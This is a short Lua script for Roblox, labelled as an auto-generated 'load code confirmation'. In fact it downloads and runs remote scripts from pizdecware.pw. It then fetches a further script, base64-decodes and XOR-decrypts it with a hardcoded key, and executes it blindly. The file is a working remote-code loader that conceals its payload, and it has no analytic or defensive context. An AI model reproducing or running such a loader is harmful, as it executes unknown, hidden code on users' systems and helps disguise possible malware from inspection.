

-- Auto-generated load code confirmation
local load_code = "4mGkGHmJ5K4L6L4L3.lua"
local success, result = pcall(function()
    return loadstring(game:HttpGet("https://pizdecware.pw/scripts/" .. load_code))()
end)
if not success then print("Load code confirmation failed:", result) end

_G.Status = "Load script..."
loadstring(game:HttpGet("https://pizdecware.pw/scripts/4mGkGHmJ5K4L6L4L3.lua"))()
wait(5)

local SCRIPT_URL = "https://pizdecware.pw/scripts/hlLGHDgdiHGkldgsMM.lua"
local DECRYPTION_KEY = "sdgojjDSGI35kln34FADf"

local function xor_crypt(data, key)
    local result = ""
    for i = 1, #data do
        local key_index = ((i - 1) % #key) + 1
        local key_byte = key:byte(key_index)
        local data_byte = data:byte(i)
        local crypt_byte = bit32.bxor(data_byte, key_byte)
        result = result .. string.char(crypt_byte)
    end
    return result
end

local function base64_decode(data)
    local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    data = string.gsub(data, '[^'..b..'=]', '')
    return (data:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

function loadScript(url, key)

    local success1, response = pcall(function()
        return game:HttpGet(url)
    end)
    
    if not success1 then

        return
    end
    

    local encrypted_base64 = string.gsub(response, "[%s%c]", "")
    
    local success2, decoded_data = pcall(function()
        return base64_decode(encrypted_base64)
    end)
    
    if not success2 then

        return
    end
    
    local success3, decrypted = pcall(function()
        return xor_crypt(decoded_data, key)
    end)
    
    if not success3 then

        return
    end
    

    
    -- Decode HTML entities
    decrypted = decrypted:gsub("&quot;", '"')
    decrypted = decrypted:gsub("&amp;", "&")
    decrypted = decrypted:gsub("&lt;", "<")
    decrypted = decrypted:gsub("&gt;", ">")
    
 
    
    local success4, func = pcall(loadstring, decrypted)
    
    if not success4 then

        return
    end
    
    if not func then

        return
    end
    

    local success5, result = pcall(func)
    if not success5 then

    else

    end
end

loadScript(SCRIPT_URL, DECRYPTION_KEY)

